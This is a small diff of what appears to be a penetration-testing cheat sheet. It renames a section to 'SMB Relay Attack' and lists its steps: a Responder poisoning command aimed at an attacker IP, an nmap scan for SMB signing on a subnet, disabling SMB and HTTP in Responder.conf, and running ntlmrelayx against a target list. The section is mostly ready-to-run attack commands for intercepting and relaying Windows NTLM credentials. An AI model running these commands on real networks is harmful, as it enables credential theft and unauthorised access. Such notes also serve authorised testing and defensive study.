@@ -16,19 +16,19 @@ responder -I tun0 -dwPv
 //attacker_ip
 ```
 
-#### SMB Environment Assessment
+#### SMB Relay Attack
 1. Security Configuration Check
 ```bash
 nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
 ```
 
-2. Network Relay Configuration
+2. SMB Relay Configuration
 ```bash
 # Configure Connection Settings
 nano /etc/responder/Responder.conf
-# Disable unnecessary protocols
+# Turn SMB & HTTP Off
 
-# Establish Network Relay
+# Establish Relay
 sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
